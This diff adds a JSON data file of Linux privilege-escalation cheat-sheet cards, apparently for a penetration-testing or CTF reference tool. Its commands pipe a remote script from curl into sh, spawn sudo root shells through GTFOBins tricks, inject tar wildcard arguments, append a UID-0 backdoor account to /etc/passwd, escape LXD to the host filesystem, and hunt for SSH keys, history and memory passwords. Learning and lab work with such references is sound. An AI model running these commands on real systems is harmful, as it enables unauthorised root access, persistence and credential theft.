@@ -1,0 +1,421 @@
+[
+  {
+    "id": "974039ae-9c5a-46dd-9960-4bbe77a2c08f",
+    "label": "Initial System & User Enum",
+    "command": "echo -e \"\\n=== Identity ===\"; id; echo -e \"\\n=== System Info ===\"; uname -a; cat /etc/os-release | grep -E \"^PRETTY_NAME=\"; hostname; echo -e \"\\n=== Activity ===\"; w; last -n 5",
+    "description": "<p><strong>When:</strong> You land a shell and want comprehensive host and user context.</p><p><strong>Output:</strong> Shows UID, kernel version, OS release, hostname, and recent logins.</p><p><strong>Next:</strong> Check for special groups (sudo/docker) or kernel exploits.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": false
+  },
+  {
+    "id": "4bfa387e-ec25-4888-a8b5-881323a5b256",
+    "label": "Local Network Reconnaissance",
+    "command": "echo -e \"\\n=== Interfaces ===\"; ip a; echo -e \"\\n=== Listening Ports ===\"; ss -tulpn; echo -e \"\\n=== Hosts File ===\"; cat /etc/hosts",
+    "description": "<p><strong>When:</strong> Mapping the target's internal network exposure.</p><p><strong>Output:</strong> Shows IP subnets, listening localhost ports, and hardcoded hostnames.</p><p><strong>Next:</strong> Find services listening on 127.0.0.1 for port-forwarding.</p>",
+    "tags": [
+      "phase:recon",
+      "platform:linux",
+      "domain:network",
+      "shell:bash"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": false
+  },
+  {
+    "id": "26bc4016-a323-4f00-8700-d65e00fa6b25",
+    "label": "SUID, SGID & Capabilities",
+    "command": "echo -e \"\\n=== SUID Binaries ===\"; find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null; echo -e \"\\n=== SGID Binaries ===\"; find / -perm -2000 -type f -exec ls -la {} \\; 2>/dev/null; echo -e \"\\n=== Capabilities ===\"; getcap -r / 2>/dev/null",
+    "description": "<p><strong>When:</strong> Hunting for binaries executing with elevated privileges or special capabilities.</p><p><strong>Output:</strong> Lists SUID/SGID files and capability assignments.</p><p><strong>Next:</strong> Check GTFOBins for any custom or standard binaries found.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "d9642db9-0660-4eb6-ae5d-540ee4ace404",
+    "label": "Scheduled Tasks & Timers",
+    "command": "echo -e \"\\n=== User Crontab ===\"; crontab -l; echo -e \"\\n=== System Cron Dirs ===\"; ls -la /etc/cron* 2>/dev/null; echo -e \"\\n=== Systemd Timers ===\"; systemctl list-timers --all",
+    "description": "<p><strong>When:</strong> Checking all scheduled task mechanisms for hijackable execution paths.</p><p><strong>Output:</strong> Shows user crons, system crons, and active timers.</p><p><strong>Next:</strong> Look for custom scripts running as root that are writable by your user.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": false
+  },
+  {
+    "id": "03612a14-b5ab-441d-8472-c8534441c525",
+    "label": "Quick Config & File Hunting",
+    "command": "echo -e \"\\n=== Writable Dirs ===\"; find / -type d -writable 2>/dev/null | grep -v \"/proc/\"; echo -e \"\\n=== SSH Keys ===\"; find / -name id_rsa 2>/dev/null; echo -e \"\\n=== Root Bash History ===\"; cat /root/.bash_history 2>/dev/null; echo -e \"\\n=== Config Passwords ===\"; grep -Rn -i 'password\\|passw\\|pwd' /etc/ 2>/dev/null | head -n 20",
+    "description": "<p><strong>When:</strong> Hunting for low-hanging fruit: passwords, private keys, and writable drop-zones.</p><p><strong>Output:</strong> Shows /tmp paths, id_rsa locations, command history, and credential hits.</p><p><strong>Next:</strong> Use found credentials or SSH keys to pivot users.</p>",
+    "tags": [
+      "phase:recon",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#22c55e",
+    "hasGraph": false
+  },
+  {
+    "id": "2c9bbf65-5e72-47e8-8252-9b2f7a232d0e",
+    "label": "Docker & Container Checks",
+    "command": "echo -e \"\\n=== Container Env ===\"; ls -la /.dockerenv 2>/dev/null; echo -e \"\\n=== Docker Socket ===\"; find / -name docker.sock 2>/dev/null",
+    "description": "<p><strong>When:</strong> Determining containerization status and docker access.</p><p><strong>Output:</strong> Reveals .dockerenv and readable docker sockets.</p><p><strong>Next:</strong> Attempt container escapes or privileged docker spawning.</p>",
+    "tags": [
+      "phase:exploit",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:docker"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "53087edb-07ab-4434-b6ec-27fcd799fe5e",
+    "label": "Nmap Target Initial Scan",
+    "command": "nmap -sC -sV -oA nmap_initial <TARGET>",
+    "description": "<p><strong>When:</strong> You need to identify open ports and services on a single Linux target before privilege escalation.</p><p><strong>Output:</strong> Shows open ports, service versions, and default script output.</p><p><strong>Next:</strong> Review services for known exploits or misconfigurations.</p>",
+    "tags": [
+      "phase:recon",
+      "platform:linux",
+      "domain:network",
+      "shell:bash",
+      "tool:nmap"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": false
+  },
+  {
+    "id": "9cb1f254-badc-4e8b-8701-8b5db9b968d0",
+    "label": "Nmap Full Port Scan",
+    "command": "nmap -p- -PA -T4 -oA nmap_full <TARGET>",
+    "description": "<p><strong>When:</strong> You want to ensure no high or non-standard ports were missed.</p><p><strong>Output:</strong> Lists all 65535 ports.</p><p><strong>Next:</strong> Target any newly discovered ports for version scanning.</p>",
+    "tags": [
+      "phase:recon",
+      "platform:linux",
+      "domain:network",
+      "shell:bash",
+      "tool:nmap"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": false
+  },
+  {
+    "id": "4b725f07-3ac7-4962-9614-4f42cbc75df7",
+    "label": "Read /etc/passwd",
+    "command": "cat /etc/passwd",
+    "description": "<p><strong>When:</strong> Listing all local accounts and identifying shell paths.</p><p><strong>Output:</strong> Shows users, home directories, and login shells.</p><p><strong>Next:</strong> Identify users with /bin/bash who might have interactive logins.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": false
+  },
+  {
+    "id": "64180b7a-1824-45c1-be24-d98463aff35d",
+    "label": "Check Sudo Permissions",
+    "command": "sudo -l",
+    "description": "<p><strong>When:</strong> Checking if the current user can run any commands as root without a password.</p><p><strong>Output:</strong> Shows NOPASSWD entries or ALL=(ALL:ALL).</p><p><strong>Next:</strong> Look up allowed binaries on GTFOBins.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#22c55e"
+  },
+  {
+    "id": "1ca19663-a122-4598-a9ee-99460035a6f1",
+    "label": "Run pspy (Process Snooping)",
+    "command": "./pspy64",
+    "description": "<p><strong>When:</strong> Monitoring running processes and cron jobs dynamically without root access.</p><p><strong>Output:</strong> Shows processes launching, UID, and command line arguments in real-time.</p><p><strong>Next:</strong> Identify hidden cron jobs or passwords passed passing via CLI.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:pspy"
+    ],
+    "color": "#f59e0b"
+  },
+  {
+    "id": "c9f3c8ae-9051-4776-b163-3901cdc8c0f8",
+    "label": "Run LinPEAS",
+    "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "description": "<p><strong>When:</strong> Running the ultimate automated privilege escalation checker.</p><p><strong>Output:</strong> Outputs color-coded findings highlighting 99% guaranteed privesc vectors.</p><p><strong>Next:</strong> Investigate RED/YELLOW text immediately.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:linpeas"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "e6d57319-30bf-466a-80a4-378060d1bffd",
+    "label": "Run Linux Exploit Suggester",
+    "command": "./linux-exploit-suggester.sh",
+    "description": "<p><strong>When:</strong> Automatically matching kernel version against known exploits.</p><p><strong>Output:</strong> Lists CVEs like PwnKit, DirtyCOW, etc.</p><p><strong>Next:</strong> Download the exploit code and compile on the target.</p>",
+    "tags": [
+      "phase:exploit",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "ef094055-da1b-4cbe-9dfd-d2ddd404e770",
+    "label": "GTFOBins: Python Sudo Shell",
+    "command": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
+    "description": "<p><strong>When:</strong> Python is allowed in sudo -l without a password.</p><p><strong>Output:</strong> Spawns a root shell.</p><p><strong>Next:</strong> Use root access to capture flags or dump hashes.</p>",
+    "tags": [
+      "phase:privesc",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:python"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "f4825a26-79e0-4f11-bbc0-324ccd3cd45d",
+    "label": "GTFOBins: Vim Sudo Shell",
+    "command": "sudo vim -c ':!/bin/sh'",
+    "description": "<p><strong>When:</strong> Vim is allowed in sudo -l without a password.</p><p><strong>Output:</strong> Spawns a root shell from within vim.</p><p><strong>Next:</strong> Use root access to capture flags or dump hashes.</p>",
+    "tags": [
+      "phase:privesc",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:vim"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "f9e85a99-ded5-471b-8db0-7d957167bbb0",
+    "label": "GTFOBins: Find Sudo Shell",
+    "command": "sudo find . -exec /bin/sh \\; -quit",
+    "description": "<p><strong>When:</strong> Find is allowed in sudo -l without a password.</p><p><strong>Output:</strong> Spawns a root shell.</p><p><strong>Next:</strong> Use root access to capture flags or dump hashes.</p>",
+    "tags": [
+      "phase:privesc",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:find"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "7478d552-46bb-4e98-8c92-a2a9bd5a2645",
+    "label": "GTFOBins: Awk Sudo Shell",
+    "command": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+    "description": "<p><strong>When:</strong> Awk is allowed in sudo -l without a password.</p><p><strong>Output:</strong> Spawns a root shell.</p><p><strong>Next:</strong> Use root access to capture flags or dump hashes.</p>",
+    "tags": [
+      "phase:privesc",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:awk"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "c02c19c8-68fc-4a36-86a4-7493c521a4f3",
+    "label": "GTFOBins: Nmap Sudo Shell",
+    "command": "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' > $TF && sudo nmap --script=$TF",
+    "description": "<p><strong>When:</strong> Nmap is allowed in sudo -l without a password.</p><p><strong>Output:</strong> Spawns a root shell by running a custom nse script.</p><p><strong>Next:</strong> Use root access to capture flags or dump hashes.</p>",
+    "tags": [
+      "phase:privesc",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:nmap"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "ec981ef6-bff0-44b9-9a60-7f954ddeb3c1",
+    "label": "GTFOBins: Less Sudo Shell",
+    "command": "sudo less /etc/profile\n!/bin/sh",
+    "description": "<p><strong>When:</strong> Less is allowed in sudo -l without a password. Type !/bin/sh inside the pager.</p><p><strong>Output:</strong> Spawns a root shell.</p><p><strong>Next:</strong> Use root access to capture flags.</p>",
+    "tags": [
+      "phase:privesc",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:less"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "972e8018-8ef5-4cbe-8b47-b09a4cd999ac",
+    "label": "Tar Wildcard PrevEsc",
+    "command": "echo '\"\" > --checkpoint-action=exec=sh\\ script.sh; \"\" > --checkpoint=1' | sh",
+    "description": "<p><strong>When:</strong> Tar is running blindly over a directory (e.g. tar *). Create files that look like tar flags.</p><p><strong>Output:</strong> When cron runs tar *, it executes your script.</p><p><strong>Next:</strong> Provide a payload script.sh to achieve root.</p>",
+    "tags": [
+      "phase:privesc",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:tar"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "400e9862-5335-439d-bfaf-06d592b9bd9a",
+    "label": "Stabilize Shell (Python PTY)",
+    "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "description": "<p><strong>When:</strong> You caught a reverse shell and need interactive features (Ctrl+C, TTY).</p><p><strong>Output:</strong> Upgrades a basic netcat shell to a PTY.</p><p><strong>Next:</strong> Export TERM and stty raw -echo for full stability.</p>",
+    "tags": [
+      "phase:setup",
+      "platform:linux",
+      "domain:network",
+      "shell:python"
+    ],
+    "color": "#22c55e",
+    "hasGraph": false
+  },
+  {
+    "id": "dc733eb1-b9d7-4663-b80e-ed6d5527ec98",
+    "label": "NFS Root Squashing Check",
+    "command": "cat /etc/exports | grep no_root_squash",
+    "description": "<p><strong>When:</strong> You want to check if the target has an exported NFS share that allows clients to run as root.</p><p><strong>Output:</strong> Outputs the export line if no_root_squash is enabled.</p><p><strong>Next:</strong> Mount the share locally, plant a SUID bash binary, and run it on the target.</p>",
+    "tags": [
+      "phase:recon",
+      "platform:linux",
+      "domain:network",
+      "shell:bash"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": true
+  },
+  {
+    "id": "650b25fa-d6a1-4f2c-91e9-0668d574d792",
+    "label": "Sudo LD_PRELOAD Hijacking",
+    "command": "sudo -l | grep -i env_keep | grep LD_PRELOAD",
+    "description": "<p><strong>When:</strong> Checking if sudo preserves the LD_PRELOAD environment variable when executing commands.</p><p><strong>Output:</strong> Outputs the env_keep line if LD_PRELOAD is present.</p><p><strong>Next:</strong> Compile a C shared library hijacking '_init', and run a permitted sudo command with LD_PRELOAD to spawn a root shell.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "a03a1d1d-78d5-4eda-926a-81714a873408",
+    "label": "Writable /etc/passwd (Add Root User)",
+    "command": "echo 'hacker:'$(openssl passwd -1 -salt hacker hacker)':0:0:root:/root:/bin/bash' >> /etc/passwd",
+    "description": "<p><strong>When:</strong> You have write access to /etc/passwd.</p><p><strong>Output:</strong> Appends a new user 'hacker' with password 'hacker' and root UID (0).</p><p><strong>Next:</strong> Run 'su hacker' to switch to your new root account.</p>",
+    "tags": [
+      "phase:exploit",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:openssl"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "47466e97-eccf-4a08-a83b-bca412bddf17",
+    "label": "LXC/LXD Group Privilege Escalation",
+    "command": "id | grep lxd && lxc image import ./alpine.tar.gz --alias myimage && lxc init myimage ignite -c security.privileged=true && lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true && lxc start ignite && lxc exec ignite /bin/sh",
+    "description": "<p><strong>When:</strong> The current user is part of the 'lxd' or 'lxc' group.</p><p><strong>Output:</strong> Spawns a root shell nested inside the container with the host's root filesystem mounted at /mnt/root.</p><p><strong>Next:</strong> You are root on the host filesystem via /mnt/root.</p>",
+    "tags": [
+      "phase:exploit",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:lxc"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "46419435-fed9-4f38-a028-2457841788dc",
+    "label": "SUID Shared Object Injection",
+    "command": "strace /usr/local/bin/custom_suid_binary 2>&1 | grep -i -E \"open|access|no such file\"",
+    "description": "<p><strong>When:</strong> You found a custom SUID binary and want to see if it tries to load missing shared libraries (.so).</p><p><strong>Output:</strong> Shows 'No such file or directory' errors for missing library paths.</p><p><strong>Next:</strong> If the missing library path is writable by you, compile a malicious C library and place it there.</p>",
+    "tags": [
+      "phase:enumerate",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash",
+      "tool:strace"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "e6e7c0ef-5a6b-41e0-8d4b-5fc0df1c0e96",
+    "label": "Dump Passwords from Memory",
+    "command": "strings /dev/mem -n10 | grep -i PASS",
+    "description": "<p><strong>When:</strong> You have read access to /dev/mem or /dev/kmem and want to hunt for plaintext credentials.</p><p><strong>Output:</strong> Outputs strings matching 'PASS' found in live system memory.</p><p><strong>Next:</strong> Look for SSH or database passwords to pivot users.</p>",
+    "tags": [
+      "phase:exploit",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "a7ae7271-1129-48b0-8f33-a21a703b1d6a",
+    "label": "Locate Target for DirtyPipe",
+    "command": "find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null | grep -E 'su|passwd'",
+    "description": "<p><strong>When:</strong> Kernel is >= 5.8 and < 5.16.11, and you need to locate a target SUID file to overwrite with the DirtyPipe exploit.</p><p><strong>Output:</strong> Outputs standard SUID binaries like /bin/su or /usr/bin/passwd.</p><p><strong>Next:</strong> Execute the compiled DirtyPipe exploit against the discovered path.</p>",
+    "tags": [
+      "phase:exploit",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "516a77f2-3446-436a-b2f1-42e3b2ab46a5",
+    "label": "Automated Exploit: PwnKit Check",
+    "command": "dpkg -l | grep policykit-1 || rpm -qa | grep polkit",
+    "description": "<p><strong>When:</strong> Checking if Polkit (specifically pkexec) is installed and active on the system.</p><p><strong>Output:</strong> Outputs installed versions of the polkit package.</p><p><strong>Next:</strong> Download and compile the CVE-2021-4034 (PwnKit) exploit to gain an immediate root shell.</p>",
+    "tags": [
+      "phase:exploit",
+      "platform:linux",
+      "domain:endpoint",
+      "shell:bash"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  }
+]
